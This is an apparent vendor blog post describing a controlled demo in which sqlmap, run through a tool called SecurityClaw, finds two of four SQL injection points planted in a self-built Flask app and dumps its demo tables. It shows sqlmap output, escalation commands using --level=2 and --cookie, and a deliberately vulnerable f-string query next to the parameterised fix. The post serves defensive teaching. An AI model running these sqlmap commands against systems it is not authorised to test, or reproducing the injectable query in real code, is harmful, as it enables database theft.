---
title: "We Planted SQL Injection in 4 Places. SecurityClaw Found 2 — and Emptied the Database in 4 Seconds."
description: "SQL injection has been on the OWASP Top 10 since 2003. We planted 4 SQLi vulnerabilities in a controlled Flask app and ran SecurityClaw's sqlmap skill against it. Two detected in under a second. Full database dump in 4.1 seconds. Here's why the other two weren't found — and why that matters more than the ones that were."
date: 2026-05-03
category: research
tags: [sql-injection, sqlmap, owasp, web-security, database-security]
---

SQL injection has been on the OWASP Top 10 since 2003. Not near the top. At the top. Twenty-three years later, it's still showing up in production databases — often because developers assume their ORM or framework handles it, or because the vulnerable endpoint was added in a rush and never audited.

This is not a tutorial on how SQL injection works. This is a live demo of what happens when a real tool — sqlmap v1.9.11, integrated into SecurityClaw — is turned on a deliberately vulnerable application. We built the target ourselves. We planted the vulnerabilities. We documented everything, including what sqlmap missed.

---

## The Setup: 4 Vulnerabilities, One Flask App

We built `sqlmap-flask-target` — a deliberately vulnerable Flask web application with four planted SQL injection points. Authorized environment, controlled conditions. The database had four tables: `users`, `products`, `orders`, and `secrets`.

| Vulnerability | Endpoint | Type |
|---|---|---|
| V1 | `GET /products?id=1` | Union-based + boolean-blind (no input sanitisation) |
| V2 | `GET /search?q=term` | Boolean-blind (LIKE query, no escaping) |
| V3 | `POST /login` (username) | Union-based (string concat in auth query) |
| V4 | `GET /dashboard` (Cookie: `user_id`) | Boolean-blind (cookie value in SQL) |

Then we ran SecurityClaw's sqlmap skill — standard settings, Level 1, default risk — against the app.

---

## What sqlmap Did

### Detection: 16 Requests, Under 1 Second

sqlmap hit `GET /products?id=1` first. The detection chain ran like this:

```
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows GET parameter 'id' might be injectable
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] 'ORDER BY' technique appears to be usable
[INFO] target URL appears to have 4 columns in query
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 4 columns' injectable
GET parameter 'id' is vulnerable.
```

**16 HTTP requests. Under 1 second.** That's how long it took to confirm a union-based SQL injection on an unparameterised integer endpoint. The parameter `id=1` was being passed directly into a SQL query with no sanitisation — one of the most common patterns in the wild.

### Table Enumeration

With a confirmed injection point, sqlmap mapped the database:

```
<current>
[4 tables]
+----------+
| orders   |
| products |
| secrets  |
| users    |
+----------+
```

Four tables. All accessible.

### The Database Dump: 4.1 Seconds Total

sqlmap dumped the `users` table first:

```
Database: <current>
Table: users
[4 entries]
+----+-------+------------------------------+-----------------+-----------+
| id | role  | email                        | password        | username  |
+----+-------+------------------------------+-----------------+-----------+
| 1  | admin | admin@demo-corp.internal     | S3cur3P@ss!2026 | admin     |
| 2  | user  | jsmith@demo-corp.internal    | password123     | jsmith    |
| 3  | user  | mwilliams@demo-corp.internal | hunter2         | mwilliams |
| 4  | dba   | dba@demo-corp.internal       | db_root_2026!   | dbadmin   |
+----+-------+------------------------------+-----------------+-----------+
```

Plaintext passwords. Admin credentials. DBA credentials. All of it — from a single unvalidated integer parameter in a GET request.

Then the `secrets` table:

```
Database: <current>
Table: secrets
[3 entries]
+----+---------------+--------------------------------------+
| id | key           | value                                |
+----+---------------+--------------------------------------+
| 1  | stripe_key    | sk_live_DEMO_DO_NOT_USE_THIS_IS_FAKE |
| 2  | smtp_password | smtp_demo_pass_not_real              |
| 3  | api_secret    | api_secret_demo_not_real_2026        |
+----+---------------+--------------------------------------+
```

The secrets table, fully dumped. In a real application, this would be live payment keys, SMTP credentials, API tokens. All exposed through one vulnerable query.

**Total time from first request to complete database dump: 4.1 seconds.**

### The Login Form Was Also Vulnerable

sqlmap also found V3 — the POST `/login` endpoint. The `username` field was passing unsanitised input directly into an authentication query:

```
[INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
POST parameter 'username' is vulnerable.
```

33 HTTP requests to confirm. Two injection points confirmed. Two database dumps complete.

---

## The Honest Part: 2 of 4

**sqlmap found 2 of 4 planted vulnerabilities at Level 1. This is the honest part of the report.**

| Vulnerability | Result |
|---|---|
| V1 — `GET /products?id` (union + boolean-blind) | ✅ Detected |
| V3 — `POST /login` username (union-based) | ✅ Detected |
| V2 — `GET /search?q` (boolean-blind LIKE) | ⚠️ Not detected at Level 1 |
| V4 — Cookie `user_id` (boolean-blind) | ⚠️ Not detected at Level 1 |

### Why V2 Wasn't Found

V2 uses a `LIKE` clause — the injection is inside `WHERE column LIKE '%[input]%'`. Boolean-blind injection in a LIKE clause is harder for sqlmap to fingerprint at Level 1 because the query structure changes how true/false responses present. It requires `--level=2` or higher.

### Why V4 Wasn't Found

V4 is cookie-based. sqlmap Level 1 doesn't test cookie parameters by default. This is documented behaviour — it's not a bug in sqlmap, it's a conscious tradeoff between scan noise and coverage. Level 2 enables cookie testing.

The flags that would catch both:

```bash
sqlmap -u "http://target/search?q=test" --level=2 -p q
sqlmap -u "http://target/dashboard" --cookie="user_id=1" --level=2
```

We didn't hide these. We document them in every SecurityClaw campaign report.

### What This Means for Defenders

The finding isn't "sqlmap missed half the vulnerabilities." The finding is more nuanced: **sqlmap at default settings catches the obvious attack surface — unescaped integer parameters, unescaped form fields in login endpoints.** These are the vulnerabilities that a less sophisticated automated tool would exploit in an attack.

Cookie-based injection and LIKE-clause blind injection require deliberate escalation. A real attacker doing a targeted engagement would escalate. An automated scan at default settings might not.

If you're running sqlmap on your own application as part of a security review, don't stop at Level 1. Run Level 2 with `--cookie` explicitly targeting session parameters. Check every dynamic input, not just the obvious GET parameters.

---

## What This Means for Real Applications

One unvalidated integer parameter. 4 seconds. Full database dump. No authentication bypassed. No special knowledge required. Just sqlmap and a GET request.

The `/products?id=1` endpoint that exposed this was a simple product listing page. The developer probably wrote `SELECT * FROM products WHERE id = {user_input}` and never thought twice about it. String formatting into SQL queries is how this happens — not malice, just habit.

### The Fix Is One Line

Parameterised queries eliminate SQL injection. Not reduce it — eliminate it.

**Vulnerable:**
```python
# Do not do this
query = f"SELECT * FROM products WHERE id = {product_id}"
cursor.execute(query)
```

**Fixed:**
```python
# Parameterised query — user input never touches SQL
cursor.execute("SELECT * FROM products WHERE id = ?", (product_id,))
```

The database driver handles the separation of SQL structure from data. The input never gets interpreted as SQL syntax. There is no injection vector.

For Python with SQLAlchemy, use the ORM or `text()` with `bindparams`. For raw queries, use prepared statements with your database driver. Most modern ORMs make this the default path — the risk is when developers bypass the ORM for "performance" or "flexibility" and write raw SQL without parameterisation.

---

## Campaign Scorecard

| Metric | Value |
|---|---|
| Campaign | #7 |
| Tool | sqlmap v1.9.11 |
| Target | Controlled Flask app (authorized, local) |
| Injection points planted | 4 |
| Detected at Level 1 | 2 (GET param + POST param) |
| Detection speed | Under 1 second per endpoint |
| Full DB dump time | 4.1 seconds |
| Tables enumerated | 4 |
| Credentials extracted | 4 users (including admin + DBA) |
| Secrets extracted | 3 (Stripe key, SMTP password, API secret) |
| False positives | 0 |

**SecurityClaw demo series: 7 campaigns. 85.71% overall pass rate.** All misses documented.

---

## The SecurityClaw Demo Series

This is part of the SecurityClaw demo series — controlled, authorized tests of real security tools against deliberately vulnerable targets. Every result is documented exactly as it came out, including the misses.

- **[TruffleHog v3: Live Secret Verification](/articles/securityclaw-trufflehog-v3-live-secret-verification-demo-2026/)** — It doesn't just find leaked secrets. It tells you if they still work.
- **[Gitleaks: Deleted Key Found in Git History](/articles/securityclaw-gitleaks-git-history-secret-detection-demo-2026/)** — Three commits after deletion, the key was still there.
- **[Gobuster: 10 Hidden Paths in 4.79 Seconds](/articles/securityclaw-gobuster-directory-enumeration-demo-2026/)** — We hid 10 sensitive paths. SecurityClaw found all 10.
- **[Nuclei: AWS Credentials Found in 8 Seconds](/articles/securityclaw-nuclei-misconfiguration-scanner-demo-2026/)** — 23 findings, 83% detection rate, CVSS 9.4.
- **[CT Logs: 79 Subdomains — Zero Packets Sent](/articles/securityclaw-ct-logs-certificate-transparency-passive-recon-2026/)** — Pure passive reconnaissance from public SSL certificate history.

SQL injection is still showing up in production. In apps built this year. In apps with code reviews and CI pipelines. The tooling to catch it at Level 1 runs in under a second. The question is whether it gets run before the attacker does.
